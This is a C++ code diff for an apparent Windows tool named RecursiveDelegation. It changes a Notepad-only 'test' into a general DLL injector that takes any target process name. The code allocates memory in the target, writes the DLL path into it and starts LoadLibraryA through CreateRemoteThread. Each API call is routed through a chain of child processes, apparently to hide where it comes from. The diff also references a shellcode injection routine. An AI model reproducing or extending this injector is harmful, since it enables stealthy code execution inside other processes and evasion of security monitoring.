@@ -167,11 +167,10 @@ void RunAllDelegationTests() {
     std::cout << "============================================" << std::endl;
 }
 
-int InjectDllToNotepadTest(int recursiveDelegationLevel, const char* dllPath) {
-    // Test inject calc dll to notepad
+int InjectDllToProcess(int recursiveDelegationLevel, const char* dllPath, const char* targetProcess) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) { // Should always be loaded
-        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
+    if (!hNtdll) {
+        hNtdll = LoadLibraryA("ntdll.dll");
         if (!hNtdll) {
             std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
             return 1;
@@ -180,111 +179,96 @@ int InjectDllToNotepadTest(int recursiveDelegationLevel, const char* dllPath) {
 
     NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
 
-    std::cout << "\n--- TESTING NOTEPAD DLL INJECTION ---" << std::endl;
-    std::cout << "NotepadInjectionTest: DLL path: " << dllPath << std::endl;
+    std::cout << "\n--- DLL INJECTION ---" << std::endl;
+    std::cout << "Target process: " << targetProcess << std::endl;
+    std::cout << "DLL path: " << dllPath << std::endl;
 
     if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
-        std::cerr << "NotepadInjectionTest: ERROR - DLL not found at: " << dllPath << std::endl;
-        std::cout << "--- Notepad DLL Injection Test SKIPPED ---" << std::endl;
+        std::cerr << "InjectDll: ERROR - DLL not found at: " << dllPath << std::endl;
         return 1;
     }
 
-    DWORD notepadPid = FindProcessPid(L"notepad.exe");
-    if (notepadPid == 0) {
-        std::cout << "--- Notepad DLL Injection Test FAILED (Notepad not found) ---" << std::endl;
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, targetProcess, -1, NULL, 0);
+    std::vector<wchar_t> wideTarget(wideLen);
+    MultiByteToWideChar(CP_ACP, 0, targetProcess, -1, wideTarget.data(), wideLen);
+
+    DWORD targetPid = FindProcessPid(wideTarget.data());
+    if (targetPid == 0) {
+        std::cerr << "InjectDll: Process not found: " << targetProcess << std::endl;
         return 1;
     }
 
-    HANDLE hNotepad = OpenProcess(
+    std::cout << "InjectDll: Found " << targetProcess << " at PID " << targetPid << std::endl;
+
+    HANDLE hTarget = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
-        TRUE, // << IMPORTANT: Make handle inheritable for child processes
-        notepadPid
+        TRUE,
+        targetPid
     );
 
-    if (hNotepad == NULL) {
-        std::cerr << "NotepadInjectionTest: OpenProcess failed for PID " << notepadPid << ". Error: " << GetLastError() << std::endl;
-        std::cout << "--- Notepad DLL Injection Test FAILED ---" << std::endl;
+    if (hTarget == NULL) {
+        std::cerr << "InjectDll: OpenProcess failed for PID " << targetPid << ". Error: " << GetLastError() << std::endl;
         return 1;
     }
-    DEBUG_PRINTF("NotepadInjectionTest: Opened inheritable handle to notepad.exe (PID %lu): 0x%p\n", notepadPid, hNotepad);
+    DEBUG_PRINTF("InjectDll: Opened inheritable handle to %s (PID %lu): 0x%p\n", targetProcess, targetPid, hTarget);
 
 
     
 
-    // 1. VirtualAllocEx in Notepad
+    // 1. VirtualAllocEx
     ApiCallResultResponse vaResponse = {};
     ApiCallParams vaParams = {};
 
     strncpy_s(vaParams.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
-	vaParams.rcx_val = (DWORD64)hNotepad;       // Inherited handle to Notepad
-    vaParams.rdx_val = (DWORD64)NULL;           // lpAddress (let system choose)
-	vaParams.r8_val = strlen(dllPath) + 1;      // dwSize
-    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE; // flAllocationType
+	vaParams.rcx_val = (DWORD64)hTarget;
+    vaParams.rdx_val = (DWORD64)NULL;
+	vaParams.r8_val = strlen(dllPath) + 1;
+    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE;
     std::vector<DWORD64> vaStackArgs;
-    vaStackArgs.push_back(PAGE_READWRITE);      // flProtect
+    vaStackArgs.push_back(PAGE_READWRITE);
 
-    std::cout << "NotepadInjectionTest: Delegating VirtualAllocEx..." << std::endl;
-    DEBUG_PRINTF("InjectDllToNotepadTest: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
+    std::cout << "InjectDll: Delegating VirtualAllocEx..." << std::endl;
+    DEBUG_PRINTF("InjectDll: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
         vaParams.rcx_val, vaParams.rdx_val, vaParams.r8_val, vaParams.r8_val, vaParams.r9_val, vaStackArgs[0]);
 
     bool delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &vaParams, &vaStackArgs, pNtContinue, NULL, "default", &vaResponse);
 
-    // Interpret output inside ApiCallResultResponse
-    if (!delegationChainSuccess) { // This means a pipe broke or a child in the chain reported failure via its wasApiCallConsideredSuccess
-        std::cerr << "--- Notepad DLL Injection Test FAILED (VirtualAllocEx delegation chain reported failure) ---" << std::endl;
-        std::cerr << "    Inspect child process debug output. Received response: Success="
-            << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
+    if (!delegationChainSuccess) {
+        std::cerr << "InjectDll: FAILED (VirtualAllocEx delegation chain reported failure)" << std::endl;
+        std::cerr << "    Response: Success=" << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
             << ", RAX=0x" << std::hex << vaResponse.apiReturnValue << std::dec
             << ", ChildLE=" << vaResponse.lastErrorValue << std::endl;
-        CloseHandle(hNotepad);
-        return 1; 
-    }
-
-    // At this point, delegationChainSuccess is TRUE.
-    // This means ProcessResultAndExit in the final child was reached and sent back a response where
-    // response.wasApiCallConsideredSuccess was TRUE.
-    // Now, you need to check the actual API outcome from vaResponse.apiReturnValue (RAX).
-    DEBUG_COUT("NotepadInjectionTest: VirtualAllocEx delegation chain reported success." << std::endl);
-    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
-        vaResponse.apiReturnValue, vaResponse.lastErrorValue);
-
-    if (vaResponse.apiReturnValue == 0) { // VirtualAllocEx failed if it returned NULL
-        std::cerr << "--- Notepad DLL Injection Test FAILED (VirtualAllocEx API call itself failed in child) ---" << std::endl;
-        std::cerr << "    RAX was 0. Child's GetLastError() in helper: " << vaResponse.lastErrorValue
-            << ". Parent's GetLastError() after OpenProcess/etc. might be different or 0." << std::endl;
-        CloseHandle(hNotepad);
+        CloseHandle(hTarget);
         return 1;
     }
 
-    DWORD64 remoteMemAddress = vaResponse.apiReturnValue; // THIS IS THE ALLOCATED ADDRESS
-    std::cout << "NotepadInjectionTest: VirtualAllocEx successful. Remote address: 0x" << std::hex << remoteMemAddress << std::dec << std::endl;
+    DEBUG_COUT("InjectDll: VirtualAllocEx delegation chain reported success." << std::endl);
+    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
+        vaResponse.apiReturnValue, vaResponse.lastErrorValue);
 
-    // 2. WriteProcessMemory to Notepad
+    if (vaResponse.apiReturnValue == 0) {
+        std::cerr << "InjectDll: FAILED (VirtualAllocEx returned NULL)" << std::endl;
+        std::cerr << "    Child's GetLastError(): " << vaResponse.lastErrorValue << std::endl;
+        CloseHandle(hTarget);
+        return 1;
+    }
 
-	// Copy the DLL path to a shared memory section - NO! We get more clever than having a leaf child to root parent shortcut.
-	//if (g_pSharedSection == NULL) {
-	//	std::cerr << "NotepadInjectionTest: ERROR - g_pSharedSection is NULL. Shared memory section not initialized." << std::endl;
-	//	CloseHandle(hNotepad);
-	//	return 1;
-	//}
+    DWORD64 remoteMemAddress = vaResponse.apiReturnValue;
+    std::cout << "InjectDll: VirtualAllocEx successful. Remote address: 0x" << std::hex << remoteMemAddress << std::dec << std::endl;
 
+    // 2. WriteProcessMemory
     ApiCallResultResponse wpmResponse;
     ApiCallParams wpmParams = {};
     strncpy_s(wpmParams.funcNameWithModule, "Kernel32!WriteProcessMemory", _TRUNCATE);
-    wpmParams.rcx_val = (DWORD64)hNotepad;
-    wpmParams.rdx_val = remoteMemAddress;         // lpBaseAddress
-    //wpmParams.r8_val = (DWORD64)dllPath;        // lpBuffer (address of our local string) we can place the data on stack and calculate the arg value after.
-    wpmParams.r9_val = strlen(dllPath) + 1;       // nSize
+    wpmParams.rcx_val = (DWORD64)hTarget;
+    wpmParams.rdx_val = remoteMemAddress;
+    wpmParams.r9_val = strlen(dllPath) + 1;
 
     std::vector<DWORD64> wpmStackArgs;
-    wpmStackArgs.push_back((DWORD64)NULL);        // lpNumberOfBytesWritten (optional)
+    wpmStackArgs.push_back((DWORD64)NULL);        // lpNumberOfBytesWritten
 
-	// lpBuffer cant be a pointer in our process so we can serialize the DLL path into a vector of DWORD64s
-    // place them on the stack and tell the executor to treat this as a stack relative pointer.
-
-    // Serialize dllPath into stack arguments.
-    wpmParams.r8_val = (DWORD64)wpmStackArgs.size() * sizeof(DWORD64); // Set r8 to the offset value of where we will start pushing the string into
-	wpmParams.r8_is_ptr_offset_from_stack = TRUE;                      // Indicate that r8_val is an offset from the stack pointer, meaning it is to be treated as a hint to the final address
+    wpmParams.r8_val = (DWORD64)wpmStackArgs.size() * sizeof(DWORD64);
+	wpmParams.r8_is_ptr_offset_from_stack = TRUE;
     const char* pStr = dllPath;
     size_t dllPathActualLen = strlen(dllPath) + 1;
     size_t numQwordsForDllPath = (dllPathActualLen + sizeof(DWORD64) - 1) / sizeof(DWORD64);
@@ -297,114 +281,99 @@ int InjectDllToNotepadTest(int recursiveDelegationLevel, const char* dllPath) {
         if (bytesToCopyThisChunk > 0) {
             memcpy(tempQwordBuffer, pStr + (i * sizeof(DWORD64)), bytesToCopyThisChunk);
         }
-        wpmStackArgs.push_back(*(DWORD64*)tempQwordBuffer); // These QWORDS are added *after* the initial NULL
+        wpmStackArgs.push_back(*(DWORD64*)tempQwordBuffer);
     }
-    // Example:
-    // dllPath: "C:\Users\Argentix\Downloads\CalcDLL64.dll"
-    // wpmStackData[0] = NULL (for lpNumberOfBytesWritten)
-    // wpmStackData[1] = First QWORD of DLL path "C:\\User"
-    // wpmStackData[2] = Second QWORD of DLL path "s\Argent" ...
-    // r8_val = offset from to wpmStackData to wpmStackData[1] where we started placing our dll string
-    // r8_is_ptr_offset_from_stack = true
-	// This way, the final Context value for R8 will be fixed into the absolute address of wpmStackData[1] in the executor process.
 
-
-    std::cout << "NotepadInjectionTest: Delegating WriteProcessMemory..." << std::endl;
-    DEBUG_PRINTF("InjectDllToNotepadTest: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, lpBuff=0x%llX, nSize=0x%llX (%llu)\n",
+    std::cout << "InjectDll: Delegating WriteProcessMemory..." << std::endl;
+    DEBUG_PRINTF("InjectDll: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, lpBuff=0x%llX, nSize=0x%llX (%llu)\n",
         wpmParams.rcx_val, wpmParams.rdx_val, wpmParams.r8_val, wpmParams.r9_val, wpmParams.r9_val);
 
-    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackArgs, pNtContinue, NULL, "default", &wpmResponse); // Use wpmResponse
+    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackArgs, pNtContinue, NULL, "default", &wpmResponse);
 
     if (!delegationChainSuccess) {
-        std::cerr << "--- Notepad DLL Injection Test FAILED (WriteProcessMemory delegation chain reported failure) ---" << std::endl;
+        std::cerr << "InjectDll: FAILED (WriteProcessMemory delegation chain reported failure)" << std::endl;
         std::cerr << "    Response: SuccessFlag=" << (wpmResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
             << ", RAX=0x" << std::hex << wpmResponse.apiReturnValue << std::dec
             << ", ChildLE=" << wpmResponse.lastErrorValue << std::endl;
-        // Consider VirtualFreeEx here
-        CloseHandle(hNotepad);
+        CloseHandle(hTarget);
         return 1;
     }
 
-    DEBUG_COUT("NotepadInjectionTest: WriteProcessMemory delegation chain reported success by child." << std::endl);
+    DEBUG_COUT("InjectDll: WriteProcessMemory delegation chain reported success." << std::endl);
     DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
         wpmResponse.apiReturnValue, wpmResponse.lastErrorValue);
 
-    if (wpmResponse.apiReturnValue == 0) { // WriteProcessMemory returns non-zero (BOOL TRUE equivalent) on success
-        std::cerr << "--- Notepad DLL Injection Test FAILED (WriteProcessMemory API call itself failed in child) ---" << std::endl;
-        std::cerr << "    RAX was 0 (indicates failure). Child's GetLastError() in helper: " << wpmResponse.lastErrorValue << std::endl;
-        // Consider VirtualFreeEx here
-        CloseHandle(hNotepad);
+    if (wpmResponse.apiReturnValue == 0) {
+        std::cerr << "InjectDll: FAILED (WriteProcessMemory returned 0)" << std::endl;
+        std::cerr << "    Child's GetLastError(): " << wpmResponse.lastErrorValue << std::endl;
+        CloseHandle(hTarget);
         return 1;
     }
-    std::cout << "NotepadInjectionTest: WriteProcessMemory successful." << std::endl;
+    std::cout << "InjectDll: WriteProcessMemory successful." << std::endl;
 
-    // --- 3. CreateRemoteThread in Notepad ---
+    // 3. CreateRemoteThread
     FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
     if (!pLoadLibraryA) {
-        std::cerr << "NotepadInjectionTest: Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
-        CloseHandle(hNotepad);
-        // Consider VirtualFreeEx here
-        std::cout << "--- Notepad DLL Injection Test FAILED ---" << std::endl;
+        std::cerr << "InjectDll: Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
+        CloseHandle(hTarget);
         return 1;
     }
 
-    ApiCallResultResponse crtResponse = {}; // Initialize
+    ApiCallResultResponse crtResponse = {};
     ApiCallParams crtParams = {};
 
     strncpy_s(crtParams.funcNameWithModule, "Kernel32!CreateRemoteThread", _TRUNCATE);
-    crtParams.rcx_val = (DWORD64)hNotepad;
-    crtParams.rdx_val = (DWORD64)NULL;          // lpThreadAttributes
-    crtParams.r8_val = 0;                       // dwStackSize
-    crtParams.r9_val = (DWORD64)pLoadLibraryA;  // lpStartAddress
+    crtParams.rcx_val = (DWORD64)hTarget;
+    crtParams.rdx_val = (DWORD64)NULL;
+    crtParams.r8_val = 0;
+    crtParams.r9_val = (DWORD64)pLoadLibraryA;
     std::vector<DWORD64> crtStackArgs;
-    crtStackArgs.push_back(remoteMemAddress);   // lpParameter (address of DLL path in remote process)
-    crtStackArgs.push_back(0);                  // dwCreationFlags
-    crtStackArgs.push_back((DWORD64)NULL);      // lpThreadId (optional)
+    crtStackArgs.push_back(remoteMemAddress);
+    crtStackArgs.push_back(0);
+    crtStackArgs.push_back((DWORD64)NULL);
 
-    std::cout << "NotepadInjectionTest: Delegating CreateRemoteThread..." << std::endl;
-    DEBUG_PRINTF("InjectDllToNotepadTest: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
+    std::cout << "InjectDll: Delegating CreateRemoteThread..." << std::endl;
+    DEBUG_PRINTF("InjectDll: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
         crtParams.rcx_val, crtParams.r9_val, crtStackArgs[0]);
 
-    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse); // Use crtResponse
+    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse);
 
     if (!delegationChainSuccess) {
-        std::cerr << "--- Notepad DLL Injection Test FAILED (CreateRemoteThread delegation chain reported failure) ---" << std::endl;
+        std::cerr << "InjectDll: FAILED (CreateRemoteThread delegation chain reported failure)" << std::endl;
         std::cerr << "    Response: SuccessFlag=" << (crtResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
             << ", RAX=0x" << std::hex << crtResponse.apiReturnValue << std::dec
             << ", ChildLE=" << crtResponse.lastErrorValue << std::endl;
-        // Consider VirtualFreeEx here
-        CloseHandle(hNotepad);
+        CloseHandle(hTarget);
         return 1;
     }
 
-    DEBUG_COUT("NotepadInjectionTest: CreateRemoteThread delegation chain reported success by child." << std::endl);
+    DEBUG_COUT("InjectDll: CreateRemoteThread delegation chain reported success." << std::endl);
     DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX (Thread Handle), Child's GetLastError() at helper = %lu\n",
         crtResponse.apiReturnValue, crtResponse.lastErrorValue);
 
-    if (crtResponse.apiReturnValue == 0) { // CreateRemoteThread returns NULL (0) on failure
-        std::cerr << "--- Notepad DLL Injection Test FAILED (CreateRemoteThread API call itself failed in child) ---" << std::endl;
-        std::cerr << "    RAX was 0 (Thread Handle is NULL). Child's GetLastError() in helper: " << crtResponse.lastErrorValue << std::endl;
-        // Consider VirtualFreeEx here
-        CloseHandle(hNotepad);
+    if (crtResponse.apiReturnValue == 0) {
+        std::cerr << "InjectDll: FAILED (CreateRemoteThread returned NULL)" << std::endl;
+        std::cerr << "    Child's GetLastError(): " << crtResponse.lastErrorValue << std::endl;
+        CloseHandle(hTarget);
         return 1;
     }
 
     HANDLE hRemoteThread = (HANDLE)crtResponse.apiReturnValue;
-    std::cout << "NotepadInjectionTest: CreateRemoteThread successful. Remote thread handle: 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;
-    std::cout << "NotepadInjectionTest: Waiting for remote thread to complete (max 10s)..." << std::endl;
+    std::cout << "InjectDll: CreateRemoteThread successful. Remote thread handle: 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;
+    std::cout << "InjectDll: Waiting for remote thread to complete (max 10s)..." << std::endl;
 
-    DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000); // Wait for the thread
+    DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000);
     if (waitResult == WAIT_OBJECT_0) {
-        std::cout << "NotepadInjectionTest: Remote thread finished." << std::endl;
+        std::cout << "InjectDll: Remote thread finished." << std::endl;
     }
     else if (waitResult == WAIT_TIMEOUT) {
-        std::cout << "NotepadInjectionTest: Remote thread timed out." << std::endl;
+        std::cout << "InjectDll: Remote thread timed out." << std::endl;
     }
     else {
-        std::cerr << "NotepadInjectionTest: WaitForSingleObject on remote thread failed. Error: " << GetLastError() << std::endl;
+        std::cerr << "InjectDll: WaitForSingleObject failed. Error: " << GetLastError() << std::endl;
     }
 
-    std::cout << "--- Notepad DLL Injection Test Potentially Successful (check if calc appears!) ---" << std::endl;
+    std::cout << "--- DLL Injection into " << targetProcess << " complete ---" << std::endl;
 
     return 0;
 }
@@ -672,20 +641,22 @@ int main(int argc, char* argv[]) {
             return InjectShellcodeToNotepadTest(level);
         }
         if (flag == "--inject-dll") {
-            if (argc < 4) {
-                std::cerr << "Usage: RecursiveDelegation.exe --inject-dll <level> <dll_path>" << std::endl;
+            if (argc < 5) {
+                std::cerr << "Usage: RecursiveDelegation.exe --inject-dll <level> <dll_path> <process_name>" << std::endl;
+                std::cerr << "Example: RecursiveDelegation.exe --inject-dll 2 \"C:\\path\\to\\my.dll\" notepad.exe" << std::endl;
                 return 1;
             }
             int level = atoi(argv[2]);
             const char* dllPath = argv[3];
-            return InjectDllToNotepadTest(level, dllPath);
+            const char* targetProcess = argv[4];
+            return InjectDllToProcess(level, dllPath, targetProcess);
         }
         if (flag == "--selftest") {
             RunAllDelegationTests();
             return 0;
         }
         std::cerr << "Unknown flag: " << flag << std::endl;
-        std::cerr << "Usage: RecursiveDelegation.exe [--selftest|--inject-notepad [level]|--inject-dll <level> <dll_path>]" << std::endl;
+        std::cerr << "Usage: RecursiveDelegation.exe [--selftest|--inject-notepad [level]|--inject-dll <level> <dll_path> <process_name>]" << std::endl;
         return 1;
     }
 
@@ -695,7 +666,7 @@ int main(int argc, char* argv[]) {
     RunAllDelegationTests();
     std::cin.get(); // Wait for user input before exiting
 
-    InjectDllToNotepadTest(recursiveDelegationLevel, "C:\\path\\to\\your.dll");
+    InjectDllToProcess(recursiveDelegationLevel, "C:\\path\\to\\your.dll", "notepad.exe");
     std::cin.get(); // Wait for user input before exiting
 
     InjectShellcodeToNotepadTest(recursiveDelegationLevel);
